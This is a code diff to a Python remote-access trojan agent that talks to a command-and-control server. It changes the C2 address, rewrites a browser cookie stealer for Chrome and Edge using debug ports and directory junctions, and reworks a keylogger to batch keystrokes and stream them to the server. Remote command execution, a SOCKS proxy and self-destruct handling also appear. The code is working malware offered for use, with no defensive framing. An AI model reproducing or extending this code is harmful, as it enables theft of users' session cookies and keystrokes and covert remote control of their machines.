@@ -99,7 +99,7 @@ except ImportError as e:
 # ======================
 class Config:
     def __init__(self):
-        self.C2_SERVER = "https://192.168.147.1"
+        self.C2_SERVER = "https://192.168.16.60"
         self.AES_KEY = b"32bytekey-ultra-secure-123456789"
         self.AES_IV = b"16byteiv-9876543"
         self.USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
@@ -107,11 +107,10 @@ class Config:
         self.SOCKS5_PORT = 1080
         self.MAX_UPLOAD_SIZE = 10 * 1024 * 1024
         self.DEBUG = True
-        self.TAKE_SCREENSHOTS = True
+        self.TAKE_SCREENSHOTS = False
         self.SCREENSHOT_FREQUENCY = 30
         self.KILLDATE_ENABLED = False
         self.KILLDATE = "" if False else ""
-
 
 
 # ======================
@@ -194,20 +193,21 @@ class CookieStealer:
         """Main method to steal cookies from all browsers"""
         results = []
         
-        # Chrome and Edge - use port 9223 for both
+        # Chrome
         chrome_data = self._process_browser_cookies(
             'chrome',
             self.CHROME_PATH,
-            9223,
+            self.chrome_debug_port,
             self.CHROME_USER_DATA_DIR
         )
         if chrome_data:
             results.append(chrome_data)
         
+        # Edge
         edge_data = self._process_browser_cookies(
             'edge',
             self.EDGE_PATH,
-            9223,
+            self.edge_debug_port,
             self.EDGE_USER_DATA_DIR
         )
         if edge_data:
@@ -222,34 +222,19 @@ class CookieStealer:
 
     def _process_browser_cookies(self, browser_name, browser_path, port, user_data_dir):
         """Process Chrome/Edge cookies"""
-        import time
         try:
             self._log('info', f"Processing {browser_name} cookies")
             
             # Start browser in debug mode
             proc = self._start_browser_debug(browser_path, port, user_data_dir)
             if not proc:
-                self._log('error', f"Failed to start {browser_name} browser process")
                 return None
 
-            # Wait for browser to start with retries
-            max_retries = 5
-            for attempt in range(max_retries):
-                if proc.poll() is not None:
-                    self._log('error', f"{browser_name} browser process exited prematurely with code {proc.returncode}")
-                    return None
-                try:
-                    cookies = self._get_cookies_via_debug(port)
-                    if cookies:
-                        break
-                except Exception as e:
-                    self._log('error', f"Attempt {attempt+1} failed to get cookies: {str(e)}")
-                time.sleep(2)
-            else:
-                self._log('error', f"Failed to connect to {browser_name} debug port after {max_retries} attempts")
-                proc.terminate()
-                proc.wait()
-                return None
+            # Wait for browser to start
+            time.sleep(5)
+            
+            # Get cookies via debug protocol
+            cookies = self._get_cookies_via_debug(port)
             
             # Clean up browser process
             proc.terminate()
@@ -335,10 +320,50 @@ class CookieStealer:
             transformed.append(transformed_cookie)
         return transformed
 
+    def _create_junctions(self):
+        """Create junctions for Chrome and Edge user data directories"""
+        temp_dir = os.getenv('TEMP')
+        chrome_junction = os.path.join(temp_dir, 'g')
+        edge_junction = os.path.join(temp_dir, 'e')
+
+        # Remove existing junctions if they exist
+        for junction in [chrome_junction, edge_junction]:
+            if os.path.exists(junction):
+                try:
+                    if os.path.isdir(junction):
+                        subprocess.run(['cmd', '/c', 'rmdir', junction], check=True)
+                    else:
+                        os.remove(junction)
+                except Exception as e:
+                    self._log('error', f"Failed to remove existing junction {junction}: {str(e)}")
+
+        # Create junctions using mklink /j
+        try:
+            subprocess.check_call(f'mklink /j "{chrome_junction}" "{self.CHROME_USER_DATA_DIR}"', shell=True)
+            self._log('info', f"Created junction {chrome_junction} -> {self.CHROME_USER_DATA_DIR}")
+        except Exception as e:
+            self._log('error', f"Failed to create junction for Chrome: {str(e)}")
+
+        try:
+            subprocess.check_call(f'mklink /j "{edge_junction}" "{self.EDGE_USER_DATA_DIR}"', shell=True)
+            self._log('info', f"Created junction {edge_junction} -> {self.EDGE_USER_DATA_DIR}")
+        except Exception as e:
+            self._log('error', f"Failed to create junction for Edge: {str(e)}")
+
+        return chrome_junction, edge_junction
+
     def _start_browser_debug(self, browser_path, port, user_data_dir):
         """Start browser in debug mode"""
         try:
             self._kill_browser(os.path.basename(browser_path))
+
+            # Create junctions and use them if user_data_dir matches Chrome or Edge paths
+            chrome_junction, edge_junction = self._create_junctions()
+            if user_data_dir == self.CHROME_USER_DATA_DIR:
+                user_data_dir = chrome_junction
+            elif user_data_dir == self.EDGE_USER_DATA_DIR:
+                user_data_dir = edge_junction
+
             command = [
                 browser_path,
                 f'--remote-debugging-port={port}',
@@ -365,20 +390,16 @@ class CookieStealer:
 
     def _get_cookies_via_debug(self, port):
         """Get cookies using Chrome DevTools Protocol"""
-        import traceback
         try:
             debug_url = f'http://localhost:{port}/json'
-            self._log('info', f"Attempting to connect to debug URL: {debug_url}")
             response = requests.get(debug_url, timeout=self.timeout)
             response.raise_for_status()
             
             data = response.json()
             if not data:
-                self._log('error', "No data received from debug URL")
                 return []
                 
             ws_url = data[0]['webSocketDebuggerUrl']
-            self._log('info', f"Connecting to WebSocket URL: {ws_url}")
             ws = websocket.create_connection(ws_url, timeout=self.timeout)
             
             ws.send(json.dumps({
@@ -390,14 +411,10 @@ class CookieStealer:
             return response['result']['cookies']
         except Exception as e:
             self._log('error', f"Debug protocol error: {str(e)}")
-            self._log('error', traceback.format_exc())
             return []
         finally:
             if 'ws' in locals():
-                try:
-                    ws.close()
-                except Exception as e:
-                    self._log('error', f"Error closing websocket: {str(e)}")
+                ws.close()
 
     def _find_firefox_profile(self):
         """Find Firefox profile directory"""
@@ -1060,38 +1077,54 @@ class SOCKS5Proxy:
 # ======================
 # Keylogger
 # ======================
+import threading
+
 class Keylogger:
-    def __init__(self, ws_client=None, agent_id=None):
+    def __init__(self):
         self.log = ""
         self.listener = None
-        self.running = False
-        self.ws_client = ws_client
-        self.agent_id = agent_id
+        self.running = threading.Event()
+        self.ws_client = None
+        self.lock = threading.Lock()
+        self.batch_size = 50
+        self.batch_interval = 5  # seconds
+        self._last_send_time = 0
+        self.logger = logging.getLogger('keylogger')
+        if not self.logger.hasHandlers():
+            handler = logging.StreamHandler()
+            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+            handler.setFormatter(formatter)
+            self.logger.addHandler(handler)
+            self.logger.setLevel(logging.DEBUG)
 
     def start(self):
-        if self.running:
+        if self.running.is_set():
+            self.logger.debug("Keylogger start called but already running")
             return {"status": "error", "message": "Keylogger already running"}
         
-        self.running = True
+        self.logger.debug("Keylogger start called")
+        self.running.set()
+        self.log = ""
+        self._last_send_time = time.time()
         self.listener = keyboard.Listener(on_press=self._on_key_press)
         self.listener.start()
+        self.logger.debug("Keylogger started and listener started")
+        self._start_sending_thread()
         return {"status": "success", "message": "Keylogger started"}
 
-    def stop(self):
-        if not self.running:
-            return {"status": "error", "message": "Keylogger not running"}
-        
-        self.running = False
-        if self.listener:
-            self.listener.stop()
-        return {"status": "success", "message": "Keylogger stopped"}
-
-    def get_logs(self):
-        logs = self.log
-        self.log = ""
-        return logs
+    def _start_sending_thread(self):
+        def send_loop():
+            self.logger.debug("Keylogger sending thread started")
+            while self.running.is_set():
+                time.sleep(self.batch_interval)
+                self._send_logs()
+        threading.Thread(target=send_loop, daemon=True).start()
 
     def _on_key_press(self, key):
+        if not self.running.is_set():
+            self.logger.debug("Keylogger received key press but not running, ignoring")
+            return
+        self.logger.debug(f"Key pressed: {key}")
         try:
             char = str(key.char)
         except AttributeError:
@@ -1101,17 +1134,61 @@ class Keylogger:
                 char = "\n"
             else:
                 char = f"[{key}]"
-        self.log += char
-        # Send keypress over websocket if connected
-        if self.ws_client and self.ws_client.connected and self.agent_id:
-            try:
+        with self.lock:
+            self.log += char
+        if len(self.log) >= self.batch_size or (time.time() - self._last_send_time) >= self.batch_interval:
+            self._send_logs()
+
+    def _send_logs(self):
+        if not self.ws_client or not self.running.is_set():
+            self.logger.debug("Keylogger _send_logs: ws_client missing or not running")
+            return
+        with self.lock:
+            if not self.log:
+                self.logger.debug("Keylogger _send_logs: no logs to send")
+                return
+            data_to_send = self.log
+            self.log = ""
+            self._last_send_time = time.time()
+        try:
+            self.logger.debug(f"Keylogger _send_logs: sending {len(data_to_send)} chars")
+            if self.ws_client and self.ws_client.socket:
+                self.logger.debug(f"Emitting keylogger_data event with data: agent_id={self.ws_client.agent_id}, keys_length={len(data_to_send)}")
                 self.ws_client.socket.emit('keylogger_data', {
-                    'agent_id': self.agent_id,
-                    'keys': char
-                }, namespace='/terminal')
-            except Exception as e:
-                # Log error but continue
-                self.log += f"[Error sending key: {str(e)}]"
+                    'agent_id': self.ws_client.agent_id,
+                    'keys': data_to_send,
+                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
+                }, namespace='/keylogger')
+                self.logger.debug("Keylogger _send_logs: sent successfully")
+            else:
+                self.logger.debug("Keylogger _send_logs: ws_client or socket not available")
+        except Exception as e:
+            self.logger.error(f"Failed to send keylogger data: {str(e)}")
+
+    def stop(self):
+        if not self.running.is_set():
+            self.logger.debug("Keylogger stop called but not running")
+            return {"status": "error", "message": "Keylogger not running"}
+        
+        self.logger.debug("Keylogger stop called")
+        self.running.clear()
+        if self.listener:
+            self.listener.stop()
+            self.logger.debug("Keylogger listener stopped")
+            self.listener.join()
+            self.logger.debug("Keylogger listener thread joined")
+            self.listener = None
+        else:
+            self.logger.debug("Keylogger listener was None")
+        self._send_logs()
+        self.logger.debug("Keylogger stopped")
+        return {"status": "success", "message": "Keylogger stopped"}
+
+    def get_logs(self):
+        with self.lock:
+            logs = self.log
+            self.log = ""
+        return logs
 
 
 # ======================
@@ -1160,10 +1237,11 @@ if platform.system() == 'Windows':
 # WebSocket Client
 # ======================
 class WebSocketClient:
-    def __init__(self, agent_id, crypto, server_url, config):
+    def __init__(self, agent_id, crypto, server_url, config, namespace):
         self.agent_id = agent_id
         self.crypto = crypto
         self.config = config
+        self.namespace = namespace
         self.server_url = server_url.replace('https://', 'wss://').replace('http://', 'ws://') + '/socket.io'
         self.socket = None
         self.connected = False
@@ -1181,42 +1259,43 @@ class WebSocketClient:
 
     def _setup_event_handlers(self):
         """Setup all WebSocket event handlers"""
-        @self.socket.on('execute_command', namespace='/terminal')
-        def on_command(data):
-            try:
-                self.logger.info(f"Executing command: {data.get('command')}")
-                
-                # Execute the command and get results
-                result = self._execute_command(data.get('command', ''))
-                
-                # Format the response properly
-                response = {
-                    'agent_id': self.agent_id,
-                    'command': data.get('command', ''),
-                    'output': result.get('output', ''),
-                    'error': result.get('error', ''),
-                    'current_dir': result.get('current_dir', '')
-                }
-                
-                self.logger.debug(f"Sending command result: {response}")
-                self.socket.emit('command_result', response, namespace='/terminal')
-                
-            except Exception as e:
-                self.logger.error(f"Command handling failed: {str(e)}")
-                self.socket.emit('command_result', {
-                    'agent_id': self.agent_id,
-                    'error': f"Command processing error: {str(e)}",
-                    'current_dir': self.current_dir
-                }, namespace='/terminal')
-        
-        @self.socket.on('force_kill', namespace='/terminal')
-        def on_force_kill(data):
-            self._log_info("[!] Received forced kill command")
-            self._immediate_self_destruct()
+        if self.namespace == '/terminal':
+            @self.socket.on('execute_command', namespace='/terminal')
+            def on_command(data):
+                try:
+                    self.logger.info(f"Executing command: {data.get('command')}")
+                    
+                    # Execute the command and get results
+                    result = self._execute_command(data.get('command', ''))
+                    
+                    # Format the response properly
+                    response = {
+                        'agent_id': self.agent_id,
+                        'command': data.get('command', ''),
+                        'output': result.get('output', ''),
+                        'error': result.get('error', ''),
+                        'current_dir': result.get('current_dir', '')
+                    }
+                    
+                    self.logger.debug(f"Sending command result: {response}")
+                    self.socket.emit('command_result', response, namespace='/terminal')
+                    
+                except Exception as e:
+                    self.logger.error(f"Command handling failed: {str(e)}")
+                    self.socket.emit('command_result', {
+                        'agent_id': self.agent_id,
+                        'error': f"Command processing error: {str(e)}",
+                        'current_dir': self.current_dir
+                    }, namespace='/terminal')
+            
+            @self.socket.on('force_kill', namespace='/terminal')
+            def on_force_kill(data):
+                self._log_info("[!] Received forced kill command")
+                self._immediate_self_destruct()
 
     def connect(self):
         try:
-            self.logger.info(f"Connecting to WebSocket at {self.server_url}")
+            self.logger.info(f"Connecting to WebSocket at {self.server_url} namespace {self.namespace}")
             
             self.socket = socketio.Client(
                 ssl_verify=False,
@@ -1231,9 +1310,9 @@ class WebSocketClient:
             connection_timeout = 10  # seconds
             connected_event = threading.Event()
 
-            @self.socket.on('connect', namespace='/terminal')
+            @self.socket.on('connect', namespace=self.namespace)
             def on_connect():
-                self.logger.info("WebSocket connected, authenticating...")
+                self.logger.info(f"WebSocket connected on {self.namespace}, authenticating...")
                 try:
                     auth_data = {
                         'agent_id': self.agent_id,
@@ -1242,16 +1321,16 @@ class WebSocketClient:
                             'timestamp': int(time.time())
                         })
                     }
-                    self.socket.emit('agent_connect', auth_data, namespace='/terminal')
+                    self.socket.emit('agent_connect', auth_data, namespace=self.namespace)
                     self._setup_event_handlers()
                     self.connected = True
                     connected_event.set()
                 except Exception as e:
                     self.logger.error(f"Authentication failed: {str(e)}")
 
-            @self.socket.on('disconnect', namespace='/terminal')
+            @self.socket.on('disconnect', namespace=self.namespace)
             def on_disconnect():
-                self.logger.warning("WebSocket disconnected")
+                self.logger.warning(f"WebSocket disconnected from {self.namespace}")
                 self.connected = False
 
             # Connect with timeout
@@ -1262,7 +1341,7 @@ class WebSocketClient:
                     'X-Agent-ID': self.agent_id
                 },
                 transports=['websocket'],
-                namespaces=['/terminal']
+                namespaces=[self.namespace]
             )
 
             if not connected_event.wait(connection_timeout):
@@ -1631,14 +1710,15 @@ class Agent:
     def _execute_task(self, task):
         try:
             task_id = task.get("task_id")
-            if task_id in self._executed_task_ids:
-                self._log_info(f"Skipping execution of duplicate task with ID: {task_id}")
-                return {
-                    "status": "error",
-                    "message": f"Task with ID {task_id} has already been executed"
-                }
+            task_id_str = str(task_id)
+            self._log_info(f"Checking task ID: {task_id_str} (type: {type(task_id)})")
+            self._log_info(f"Current executed task IDs: {self._executed_task_ids}")
+            if task_id_str in self._executed_task_ids:
+                self._log_info(f"Skipping execution of duplicate task with ID: {task_id_str}")
+                return None
             else:
-                self._executed_task_ids.add(task_id)
+                self._log_info(f"Executing new task with ID: {task_id_str}")
+                self._executed_task_ids.add(task_id_str)
 
             task_type = task.get("type")
             self._log_info(f"Received task: {json.dumps(task, indent=2)}")
@@ -1662,7 +1742,8 @@ class Agent:
                             self.agent_id,
                             self.crypto,
                             self.config.C2_SERVER,
-                            self.config
+                            self.config,
+                            '/terminal'
                         )
                     
                     if not self.ws_client.connected:
@@ -1890,19 +1971,41 @@ class Agent:
                 else:
                     return self.socks_proxy.stop()
             
-            elif task_type == "keylogger":
-                if task.get("action") == "start":
+            if task_type == "keylogger":
+                action = task.get("action") or task.get("data", {}).get("action")
+                if action == "start":
+                    if not hasattr(self, 'keylogger_ws_client') or not self.keylogger_ws_client or not self.keylogger_ws_client.connected:
+                        self.keylogger_ws_client = WebSocketClient(
+                            self.agent_id,
+                            self.crypto,
+                            self.config.C2_SERVER,
+                            self.config,
+                            '/keylogger'
+                        )
+                    if self.keylogger_ws_client.connect():
+                        self.keylogger.ws_client = self.keylogger_ws_client
+                    else:
+                        return {"status": "error", "message": "Failed to connect WebSocket for keylogger"}
                     return self.keylogger.start()
-                else:
+                elif action == "stop":
+                    self._log_info("Stopping keylogger")
+                    # Send any remaining logs before stopping
+                    if self.keylogger.ws_client and self.keylogger.running:
+                        self.keylogger._send_logs()
                     result = self.keylogger.get_logs()
                     self.keylogger.stop()
+                    if hasattr(self, 'keylogger_ws_client') and self.keylogger_ws_client and self.keylogger_ws_client.connected:
+                        self._log_info("Disconnecting keylogger WebSocket client")
+                        self.keylogger_ws_client.disconnect()
+                    self.keylogger.ws_client = None
+                    self.keylogger_ws_client = None
                     return {"logs": result}
-            
-            else:
-                return {
-                    "status": "error",
-                    "message": f"Unknown task type: {task_type}"
-                }
+                
+                else:
+                    return {
+                        "status": "error",
+                        "message": f"Unknown task type: {task_type}"
+                    }
         
         except Exception as e:
             self._log_error(f"Error executing task: {str(e)}")
